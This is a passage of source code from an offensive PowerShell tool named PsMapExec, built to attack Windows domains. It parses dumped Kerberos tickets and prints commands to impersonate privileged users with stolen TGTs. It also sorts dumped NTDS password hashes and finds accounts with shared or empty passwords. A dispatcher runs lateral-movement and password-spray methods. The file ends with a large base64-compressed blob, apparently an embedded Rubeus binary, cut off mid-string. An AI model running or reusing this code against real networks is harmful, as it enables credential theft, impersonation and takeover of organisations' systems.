            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName     = $match.Groups[1].Value
                    EncryptionType  = $match.Groups[2].Value
                    TicketExp       = $match.Groups[3].Value
                    ServerName      = $match.Groups[4].Value
                    UserName        = $match.Groups[5].Value
                    Flags           = $match.Groups[6].Value
                    SessionKeyType  = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }

                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else {Write-Host "Server Name   : $($data.ServerName.ToLower())"}
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT"){
                        do {
                            $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                        } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                        Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                        # A neat one-liner instruction for the user
                        Write-Host "Impersonate   : PsMapExec -Targets $Targets -Method $Method -Ticket `$$randomVarName"
                        Write-Host
                        
                        } Else {Write-Host}
                    }
                }
            }

             # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

    Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Run with -NoParse to prevent parsing results in the future"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Each ticket has been stored in $KerbDump"
}

################################################################################################################
############################################## Function: Parse-NTDS ############################################
################################################################################################################

Function Parse-NTDS {
    param (
        [string]$DirectoryPath
    )

        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-sleep -Seconds "2"

    if ([string]::IsNullOrEmpty($DirectoryPath)) {
        Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
        return
    }

    if (-not (Test-Path -Path $DirectoryPath)) {
        Write-Host "Directory at path '$DirectoryPath' does not exist." -ForegroundColor Red
        return
    }

    $currentTime = Get-Date -Format "yyyyMMddHHmmss"
    Get-ChildItem -Path $DirectoryPath -Filter "*-NTDS.txt" -File | ForEach-Object {
        $NTDSFile = $_.FullName
        $computerName = [IO.Path]::GetFileNameWithoutExtension($_.Name) -replace "-NTDS", ""
        $newDirectoryName = "${computerName}-${currentTime}"
        $newDirectoryPath = Join-Path $DirectoryPath $newDirectoryName

        if (-not (Test-Path -Path $newDirectoryPath)) {
            New-Item -Path $newDirectoryPath -ItemType "Directory" | Out-Null
        }

        $userHashes = @()
        $computerHashes = @()
        $identicalPasswordGroups = @{}
        $emptyPasswordUsers = @()
        $samHashes = @()

        $prevLine = ""
        Get-Content $NTDSFile | ForEach-Object {
            $line = $_
            $parts = $line -split ':'
            $user = $parts[0]
            $hash = $parts[3]

            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
                $emptyPasswordUsers += $user
            }

            if ($user -like "*$*") {
                $computerHashes += $line
            } else {
                $userHashes += $line

                if ($hash -ne $null) {
                    if (-not $identicalPasswordGroups.ContainsKey($hash)) {
                        $identicalPasswordGroups[$hash] = @()
                    }
                    $identicalPasswordGroups[$hash] += $user
                }

                # Check if the previous line and the current line do not have two "::" in a row
                if (-not ($line -match ':::' -and $prevLine -match ':::')) {
                    $samHashes += $line
                }
            }

            $prevLine = $line
        }

        $userHashes | Set-Content -Path (Join-Path $newDirectoryPath "UserHashes.txt")
        $computerHashes | Set-Content -Path (Join-Path $newDirectoryPath "ComputerHashes.txt")
        $emptyPasswordUsers | Set-Content -Path (Join-Path $newDirectoryPath "UsersWithEmptyPasswords.txt")

        $groupNumber = 1
        $groupedUsersContent = foreach ($group in $identicalPasswordGroups.GetEnumerator()) {
            if ($group.Value.Count -gt 1) {
                $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
                $groupNumber++
                $groupContent
                Write-Output ""
            }
        }

        $groupedUsersContent | Set-Content -Path (Join-Path $newDirectoryPath "GroupedUsersWithIdenticalPasswords.txt")

        $newFileName = ".$computerName-NTDS-Full.txt"
        Move-Item -Path $NTDSFile -Destination (Join-Path $newDirectoryPath $newFileName) -Force

        # Write SAM hashes to SAMHashes.txt
        $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
    }

    Write-Output ""
    Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-host "Parsed NTDS files stored in $newDirectoryPath"

    if ($Rainbow){
    RainbowCheck -Module "NTDS" -RCFilePath (Join-Path $newDirectoryPath "UserHashes.txt")

    }

}


################################################################################################################
################################################ Execute defined functions #####################################
################################################################################################################

switch ($Method) {
        "All" {Method-All}
        "WinRM" {Method-WinRM}
        "MSSQL" {Method-MSSQL}
        "SMB" {Method-SMB}
        "WMI" {Method-WMIexec}
        "RDP" {Method-RDP}
        "GenRelayList" {GenRelayList}
        "SessionHunter" {Invoke-SessionHunter}
        "Spray" {Method-Spray}
        "VNC" {Method-VNC}
        
        default {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Invalid Method specified"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
        return
      
      }
 }

if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}
if (!$NoParse){if ($Module -eq "NTDS"){Parse-NTDS -DirectoryPath $NTDS}}

RestoreTicket

Write-Host ""
$Time = (Get-Date).ToString("HH:mm:ss")
Write-Host "Script Completed : $Time"
$elapsedTime = (Get-Date) - $startTime

# Format the elapsed time
$elapsedHours = "{0:D2}" -f $elapsedTime.Hours
$elapsedMinutes = "{0:D2}" -f $elapsedTime.Minutes
$elapsedSeconds = "{0:D2}" -f $elapsedTime.Seconds
$elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds

# Display the formatted elapsed time
$elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
Write-Host "Elapsed Time     : $elapsedTime"
try {$searcher.Dispose()} Catch {}
$CurrentUser = $null

}

$Global:rbs = @'
function Invoke-Rubeus
{
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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